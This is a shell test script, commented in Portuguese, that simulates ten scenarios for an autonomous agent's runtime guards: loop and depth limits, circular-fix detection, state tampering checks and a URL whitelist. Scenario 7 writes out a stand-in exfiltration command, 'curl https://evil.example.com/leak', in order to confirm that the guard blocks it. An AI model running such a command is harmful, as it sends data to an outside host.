#!/bin/sh
# quickstart-shell-sim.sh — simula via Bash os 10 cenarios do quickstart do
# agente-00C, sem invocar o agente Claude Code.
#
# Ref: docs/specs/agente-00c/quickstart.md (10 cenarios)
#      docs/specs/agente-00c/tasks.md FASE 9.1
#
# Cada cenario compoe primitivas dos scripts em
# global/skills/agente-00c-runtime/scripts/ e verifica que os exit codes +
# mutacoes de estado batem com o esperado.
#
# E shell-level: NAO valida comportamento do LLM (heuristica score, qualidade
# de perguntas, etc). Detecta regressoes onde um script deixa de compor com
# os outros.
#
# Uso:
#   scripts/quickstart-shell-sim.sh [--scenario N] [--keep-tmp]
#   scripts/quickstart-shell-sim.sh --help
#
# POSIX sh + jq + git.

set -eu

REPO_ROOT="$(cd -- "$(dirname -- "$0")/.." && pwd)"
S="$REPO_ROOT/global/skills/agente-00c-runtime/scripts"
KEEP_TMP=0
ONLY_SCENARIO=""

# Cores (opcional — terminal sem cores ignora)
RED=$(printf '\033[31m'); GREEN=$(printf '\033[32m'); YELLOW=$(printf '\033[33m'); RESET=$(printf '\033[0m')

usage() {
  cat >&2 <<HELP
quickstart-shell-sim.sh — shell-simulation dos 10 cenarios do quickstart 00C.

USO:
  scripts/quickstart-shell-sim.sh [--scenario N] [--keep-tmp]

OPCOES:
  --scenario N    Roda apenas o cenario N (1..10). Default: todos.
  --keep-tmp      NAO limpa tmpdir apos execucao (debug).
  --help          Esta mensagem.

EXIT:
  0  todos os cenarios PASS
  1  algum cenario FAIL
HELP
}

while [ "$#" -gt 0 ]; do
  case "$1" in
    --scenario) ONLY_SCENARIO=$2; shift 2 ;;
    --keep-tmp) KEEP_TMP=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) printf '%s\n' "flag desconhecida: $1" >&2; usage; exit 2 ;;
  esac
done

# Setup global
if ! command -v jq >/dev/null 2>&1; then
  printf '%s\n' "jq nao encontrado — abortando" >&2
  exit 2
fi

TMP=$(mktemp -d -t agente-00c-shellsim.XXXXXX)
[ "$KEEP_TMP" = 1 ] || trap 'rm -rf -- "$TMP"' EXIT INT TERM

PASS_COUNT=0
FAIL_COUNT=0
SKIP_COUNT=0

# Output helpers
_pass() { printf '%s[PASS]%s scenario %s — %s\n' "$GREEN" "$RESET" "$1" "$2"; PASS_COUNT=$((PASS_COUNT + 1)); }
_fail() { printf '%s[FAIL]%s scenario %s — %s\n' "$RED" "$RESET" "$1" "$2"; FAIL_COUNT=$((FAIL_COUNT + 1)); }
_skip() { printf '%s[SKIP]%s scenario %s — %s\n' "$YELLOW" "$RESET" "$1" "$2"; SKIP_COUNT=$((SKIP_COUNT + 1)); }

# Helper: cria state inicial limpo
_setup_state() {
  _sd="$TMP/scenario-$1/state"
  _pap="$TMP/scenario-$1/proj"
  mkdir -p "$_pap"
  ( cd "$_pap" && git init -q -b main && git config user.email t@t && git config user.name t ) >/dev/null 2>&1
  "$S/state-rw.sh" init --state-dir "$_sd" \
    --execucao-id "exec-sim-$1-$(date +%s)" \
    --projeto-alvo-path "$_pap" \
    --descricao "POC shell-sim cenario $1 — descricao adequada com 30+ chars" \
    >/dev/null 2>&1
  printf '%s' "$_sd"
}

_should_run() {
  [ -z "$ONLY_SCENARIO" ] || [ "$ONLY_SCENARIO" = "$1" ]
}

# ==== Scenario 1 — Happy path completo ====
# Espera: init -> start -> decisao -> end -> report 6 secoes -> validate OK
scenario_1() {
  _should_run 1 || return 0
  _sd=$(_setup_state 1)
  set +e
  "$S/state-ondas.sh" start --state-dir "$_sd" >/dev/null
  "$S/state-decisions.sh" register --state-dir "$_sd" \
    --agente "orquestrador-00c" --etapa "briefing" \
    --contexto "Pergunta sobre stakeholders no briefing inicial" \
    --opcoes '["Operador unico","Time pequeno"]' --escolha "Operador unico" \
    --justificativa "Briefing marca uso pessoal sem stakeholders externos" >/dev/null
  "$S/state-ondas.sh" end --state-dir "$_sd" --motivo-termino etapa_concluida_avancando >/dev/null
  "$S/report.sh" generate --state-dir "$_sd" \
    --paragrafo-resumo "Cenario 1 happy path completo com 1 onda + 1 decisao." \
    > "$_sd/report.md" 2>/dev/null
  "$S/report.sh" validate --report-file "$_sd/report.md" >/dev/null 2>&1
  _rc=$?
  set -e
  if [ $_rc = 0 ]; then
    _pass 1 "happy path: state init + onda + decisao + report 6 secoes valido"
  else
    _fail 1 "report.sh validate retornou $_rc"
  fi
}

# ==== Scenario 2 — Pause por bloqueio humano ====
scenario_2() {
  _should_run 2 || return 0
  _sd=$(_setup_state 2)
  set +e
  "$S/state-decisions.sh" register --state-dir "$_sd" \
    --agente "clarify-answerer" --etapa "clarify" \
    --contexto "Pergunta com score 0 — nenhuma fonte suporta opcoes" \
    --opcoes '["A","B"]' --escolha "pause-humano" \
    --justificativa "Score 0 — nem briefing nem stack-sugerida apontam direcao" \
    --score 0 >/dev/null
  "$S/bloqueios.sh" register --state-dir "$_sd" --decisao-id "dec-001" \
    --pergunta "Qual stack escolher para o backend, Go ou Node?" \
    --contexto-para-resposta "Briefing nao define; stack-sugerida vazia" \
    --opcoes-recomendadas '["Go","Node"]' >/dev/null
  _status_after_block=$("$S/state-rw.sh" get --state-dir "$_sd" --field '.execucao.status')
  set -e
  if [ "$_status_after_block" = "aguardando_humano" ]; then
    _pass 2 "score 0 -> bloqueio + status=aguardando_humano"
  else
    _fail 2 "esperado aguardando_humano, obtido $_status_after_block"
  fi
}

# ==== Scenario 3 — Aborto por loop em etapa (>5 ciclos sem progresso) ====
scenario_3() {
  _should_run 3 || return 0
  _sd=$(_setup_state 3)
  set +e
  for _ in 1 2 3 4 5; do "$S/cycles.sh" tick --state-dir "$_sd" >/dev/null; done
  "$S/cycles.sh" tick --state-dir "$_sd" >/dev/null 2>&1
  _rc=$?
  set -e
  if [ $_rc = 3 ]; then
    _pass 3 "ciclos > 5 -> exit 3 (loop_em_etapa)"
  else
    _fail 3 "esperado exit 3, obtido $_rc"
  fi
}

# ==== Scenario 4 — Retomada apos /clear (sha256-verify) ====
scenario_4() {
  _should_run 4 || return 0
  _sd=$(_setup_state 4)
  set +e
  "$S/state-ondas.sh" start --state-dir "$_sd" >/dev/null
  "$S/state-rw.sh" sha256-verify --state-dir "$_sd" >/dev/null 2>&1
  _rc1=$?
  # Simula corrupcao externa (operador editou state.json)
  echo "tampered" >> "$_sd/state.json"
  "$S/state-rw.sh" sha256-verify --state-dir "$_sd" >/dev/null 2>&1
  _rc2=$?
  set -e
  if [ $_rc1 = 0 ] && [ $_rc2 = 1 ]; then
    _pass 4 "sha256-verify pos-init OK + detecta corrupcao com exit 1"
  else
    _fail 4 "esperado (0, 1), obtido ($_rc1, $_rc2)"
  fi
}

# ==== Scenario 5 — Aborto manual via /agente-00c-abort (simulado via state) ====
scenario_5() {
  _should_run 5 || return 0
  _sd=$(_setup_state 5)
  set +e
  "$S/state-ondas.sh" start --state-dir "$_sd" >/dev/null
  "$S/state-ondas.sh" end --state-dir "$_sd" --motivo-termino aborto >/dev/null
  "$S/state-rw.sh" set --state-dir "$_sd" --field '.execucao.status' --value '"abortada"' >/dev/null
  "$S/state-rw.sh" set --state-dir "$_sd" --field '.execucao.motivo_termino' --value '"aborto_manual"' >/dev/null
  "$S/state-rw.sh" set --state-dir "$_sd" --field '.execucao.terminada_em' --value "\"$(date -u +%FT%TZ)\"" >/dev/null
  "$S/state-validate.sh" --state-dir "$_sd" >/dev/null 2>&1
  _rc=$?
  set -e
  _status=$("$S/state-rw.sh" get --state-dir "$_sd" --field '.execucao.status')
  if [ $_rc = 0 ] && [ "$_status" = "abortada" ]; then
    _pass 5 "fluxo de abort manual + validacao schema pos-abort OK"
  else
    _fail 5 "validate=$_rc, status=$_status (esperado 0, abortada)"
  fi
}

# ==== Scenario 6 — Bug em skill global vira issue (dry-run) ====
scenario_6() {
  _should_run 6 || return 0
  _sd=$(_setup_state 6)
  _md="$TMP/scenario-6/sug.md"
  set +e
  "$S/state-decisions.sh" register --state-dir "$_sd" \
    --agente "orquestrador-00c" --etapa "clarify" \
    --contexto "Bug detectado em skill clarify durante a etapa clarify" \
    --opcoes '["A","B"]' --escolha "A" \
    --justificativa "Necessario registrar para auditoria do bug encontrado" >/dev/null
  "$S/suggestions.sh" register --state-dir "$_sd" --suggestions-file "$_md" \
    --skill "clarify" --severidade "impeditiva" \
    --diagnostico "Skill clarify gerou opcoes contraditorias entre Q3 e Q5 para o mesmo escopo" \
    --proposta "Adicionar etapa de cross-check entre perguntas geradas pela skill clarify" >/dev/null
  # Dry-run de issue.sh
  "$S/issue.sh" create --state-dir "$_sd" --suggestion-id "sug-001" \
    --skill "clarify" \
    --diagnostico "Skill clarify gerou opcoes contraditorias entre Q3 e Q5 para o mesmo escopo" \
    --proposta "Adicionar etapa de cross-check entre perguntas geradas pela skill clarify" \
    --por-que-impeditivo "Pipeline ja consumiu 1 retro" \
    --dry-run > "$TMP/scenario-6/issue-dry.txt" 2>&1
  _rc=$?
  set -e
  if [ $_rc = 0 ] && grep -q "DRY-RUN" "$TMP/scenario-6/issue-dry.txt" \
     && grep -q "Bug em clarify" "$TMP/scenario-6/issue-dry.txt"; then
    _pass 6 "decisao + sugestao impeditiva + issue dry-run com template completo"
  else
    _fail 6 "issue dry-run falhou (rc=$_rc) ou template incompleto"
  fi
}

# ==== Scenario 7 — URL fora da whitelist e bloqueada ====
scenario_7() {
  _should_run 7 || return 0
  _sd=$(_setup_state 7)
  _wl="$TMP/scenario-7/wl"
  cat > "$_wl" <<EOF
https://api.github.com/repos/JotJunior/cstk/**
https://github.com/JotJunior/cstk
EOF
  set +e
  "$S/bash-guard.sh" check-whitelist \
    --command "curl https://evil.example.com/leak" \
    --whitelist-file "$_wl" >/dev/null 2>&1
  _rc1=$?
  "$S/bash-guard.sh" check-whitelist \
    --command "curl https://api.github.com/repos/JotJunior/cstk/issues" \
    --whitelist-file "$_wl" >/dev/null 2>&1
  _rc2=$?
  set -e
  if [ $_rc1 = 1 ] && [ $_rc2 = 0 ]; then
    _pass 7 "whitelist bloqueia evil.example.com + permite api.github.com/repos/<toolkit>"
  else
    _fail 7 "esperado (1, 0), obtido ($_rc1, $_rc2)"
  fi
}

# ==== Scenario 8 — Tentativa de spawnar tataraneto (profundidade > 3) ====
scenario_8() {
  _should_run 8 || return 0
  _sd=$(_setup_state 8)
  set +e
  "$S/spawn-tracker.sh" enter --state-dir "$_sd" >/dev/null  # 1 -> 2
  "$S/spawn-tracker.sh" enter --state-dir "$_sd" >/dev/null  # 2 -> 3
  _curr_before=$(jq -r '.orcamentos.profundidade_corrente_subagentes' "$_sd/state.json")
  "$S/spawn-tracker.sh" enter --state-dir "$_sd" >/dev/null 2>&1  # 3 -> 4 NEGADO
  _rc=$?
  _curr_after=$(jq -r '.orcamentos.profundidade_corrente_subagentes' "$_sd/state.json")
  set -e
  if [ $_rc = 3 ] && [ "$_curr_before" = "$_curr_after" ]; then
    _pass 8 "tataraneto bloqueado com exit 3 + estado intacto (profundidade ainda $_curr_after)"
  else
    _fail 8 "rc=$_rc, before=$_curr_before, after=$_curr_after (esperado rc=3 + iguais)"
  fi
}

# ==== Scenario 9 — Movimento circular detectado ====
scenario_9() {
  _should_run 9 || return 0
  _sd=$(_setup_state 9)
  set +e
  "$S/circular.sh" push --state-dir "$_sd" --problema "Test failing on null" --solucao "fix1" >/dev/null
  "$S/circular.sh" push --state-dir "$_sd" --problema "Lint complains" --solucao "fix2" >/dev/null
  "$S/circular.sh" push --state-dir "$_sd" --problema "Test failing on null" --solucao "fix3" >/dev/null
  "$S/circular.sh" push --state-dir "$_sd" --problema "Lint complains" --solucao "fix4" >/dev/null
  "$S/circular.sh" push --state-dir "$_sd" --problema "Test failing on null" --solucao "fix5" >/dev/null
  "$S/circular.sh" detect --state-dir "$_sd" >/dev/null 2>&1
  _rc=$?
  set -e
  if [ $_rc = 3 ]; then
    _pass 9 "mesmo problema 3x detectado -> exit 3 (movimento_circular)"
  else
    _fail 9 "esperado exit 3, obtido $_rc"
  fi
}

# ==== Scenario 10 — Estado corrompido na retomada ====
scenario_10() {
  _should_run 10 || return 0
  _sd=$(_setup_state 10)
  set +e
  # Corrupcao 1: schema invalido
  jq '.schema_version = "9.9.9"' "$_sd/state.json" > "$_sd/state.json.tmp" \
    && mv "$_sd/state.json.tmp" "$_sd/state.json"
  "$S/state-validate.sh" --state-dir "$_sd" >/dev/null 2>&1
  _rc1=$?
  # Reseta
  jq '.schema_version = "1.0.0"' "$_sd/state.json" > "$_sd/state.json.tmp" \
    && mv "$_sd/state.json.tmp" "$_sd/state.json"
  # Corrupcao 2: profundidade > 3
  jq '.orcamentos.profundidade_corrente_subagentes = 5' "$_sd/state.json" > "$_sd/state.json.tmp" \
    && mv "$_sd/state.json.tmp" "$_sd/state.json"
  "$S/state-validate.sh" --state-dir "$_sd" >/dev/null 2>&1
  _rc2=$?
  set -e
  if [ $_rc1 = 1 ] && [ $_rc2 = 1 ]; then
    _pass 10 "schema_version desconhecido + profundidade > 3 ambos detectados"
  else
    _fail 10 "esperado (1, 1), obtido ($_rc1, $_rc2)"
  fi
}

# ==== Roda tudo ====
printf '\n=== Quickstart Shell-Simulation (FASE 9.1) ===\n\n'
scenario_1
scenario_2
scenario_3
scenario_4
scenario_5
scenario_6
scenario_7
scenario_8
scenario_9
scenario_10

printf '\n=== Resultado ===\n'
printf '%sPASS%s: %s\n' "$GREEN" "$RESET" "$PASS_COUNT"
printf '%sFAIL%s: %s\n' "$RED" "$RESET" "$FAIL_COUNT"
[ "$SKIP_COUNT" -gt 0 ] && printf '%sSKIP%s: %s\n' "$YELLOW" "$RESET" "$SKIP_COUNT"

if [ "$KEEP_TMP" = 1 ]; then
  printf '\nTmpdir preservado: %s\n' "$TMP"
fi

[ "$FAIL_COUNT" = 0 ] || exit 1
exit 0
